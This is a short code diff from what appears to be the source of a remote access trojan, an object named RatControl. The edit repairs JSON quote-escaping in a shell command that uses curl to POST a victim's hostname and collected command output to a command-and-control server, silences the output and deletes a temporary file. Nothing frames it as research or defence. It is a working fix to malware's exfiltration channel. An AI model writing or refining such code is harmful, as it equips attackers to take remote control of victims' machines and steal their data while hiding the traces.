@@ -131,7 +131,7 @@ object RatControl {
             "curl -s -m 25 -X POST " + c2 + "/r " +
             "-H " + RAT_SQ + "Content-Type: application/json" + RAT_SQ + " " +
             "-d " + RAT_DQ + "{" + RAT_BS + RAT_DQ + "host" + RAT_BS + RAT_DQ + ":" + RAT_BS + RAT_DQ +
-            safeHost + RAT_BS + RAT_DQ + "," + RAT_BS + RAT_DQ + "data" + RAT_BS + RAT_DQ + ":" + sh +
+            safeHost + RAT_BS + RAT_DQ + "," + RAT_BS + RAT_DQ + "data" + RAT_BS + RAT_DQ + ":" + RAT_BS + RAT_DQ + sh +
             "D" + RAT_BS + RAT_DQ + "}" + RAT_DQ + " >/dev/null 2>&1; rm -f " + sh + "T"
     }
 
